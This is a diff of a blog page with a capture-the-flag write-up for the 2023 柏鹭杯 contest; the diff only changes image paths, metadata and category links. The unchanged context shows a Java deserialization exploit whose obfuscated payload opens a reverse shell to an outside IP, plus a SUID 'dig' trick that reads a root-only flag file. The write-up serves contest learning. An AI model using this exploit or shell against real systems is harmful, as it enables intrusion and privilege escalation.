@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/background/fj_img/8.jpg">
 <meta property="article:published_time" content="2023-10-18T11:40:58.000Z">
-<meta property="article:modified_time" content="2023-10-22T05:35:36.555Z">
+<meta property="article:modified_time" content="2024-03-05T06:12:41.412Z">
 <meta property="article:author" content="dddkia">
 <meta property="article:tag" content="misc">
 <meta property="article:tag" content="wp">
@@ -368,7 +368,7 @@
 <p>拿到源码</p>
 <p>Upload.class，upload类中有混淆加密的flag1</p>
 <figure>
-<img src="../img/2023柏鹭杯/16976293252215.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023柏鹭杯/16976293252215.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>逆向一下得到flag1</p>
@@ -376,24 +376,24 @@
 <h2 id="综合题6"><strong>综合题</strong>6</h2>
 <p>源码中Ping.class是一个恶意类，readObject反序列化，exec可以命令执行</p>
 <figure>
-<img src="../img/2023柏鹭杯/16976293252171.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023柏鹭杯/16976293252171.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>通过Upload类的<code>/internalApi/v3.2/updateConfig</code>此路由可以反序列化加载恶意类Ping进行命令执行</p>
 <figure>
-<img src="../img/2023柏鹭杯/16976293252172.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023柏鹭杯/16976293252172.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>Ser.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// Create a Ping object</span><br>        <span class="hljs-type">Ping</span> <span class="hljs-variable">ping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ping</span>();<br>        ping.setCommand(<span class="hljs-string">&quot;bash&quot;</span>);<br>        ping.setArg1(<span class="hljs-string">&quot;-c&quot;</span>);<br>        ping.setArg2(<span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEyLjI1MS42Mi80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);<br><br>        <span class="hljs-comment">// Serialize the Ping object to a byte array</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(ping);<br><br>        <span class="hljs-comment">// Encode the byte array to Base64</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>        System.out.println(<span class="hljs-string">&quot;Payload: &quot;</span> + payload);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Payload: rO0ABXNyABVjb20uZXhhbXBsZS5kZW1vLlBpbmcAAAAAAAAAAQIAA0wABGFyZzF0ABJMamF2YS9sYW5nL1N0cmluZztMAARhcmcycQB+AAFMAAdjb21tYW5kcQB+AAF4cHQAAi1jdABfYmFzaCAtYyAne2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRXlMakkxTVM0Mk1pODBOVFkzSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSd0AARiYXNo</span><br></code></pre></td></tr></table></figure>
 <p>反弹shell</p>
 <figure>
-<img src="../img/2023柏鹭杯/16976293252183.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023柏鹭杯/16976293252183.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>find找suid，dig提权，<code>/usr/bin/dig -f /root/flag2</code></p>
 <figure>
-<img src="../img/2023柏鹭杯/16976293252184.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023柏鹭杯/16976293252184.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h2 id="综合题7">综合题7</h2>
@@ -438,7 +438,7 @@ target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/10/12/
     
       <span class="category-chain">
         
-  <a href="/categories/misc/" class="category-chain-item">misc</a>
+  <a href="/categories/web/" class="category-chain-item">web</a>
   
   
 
@@ -448,7 +448,7 @@ target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/10/12/
     
       <span class="category-chain">
         
-  <a href="/categories/web/" class="category-chain-item">web</a>
+  <a href="/categories/misc/" class="category-chain-item">misc</a>
   
   
 
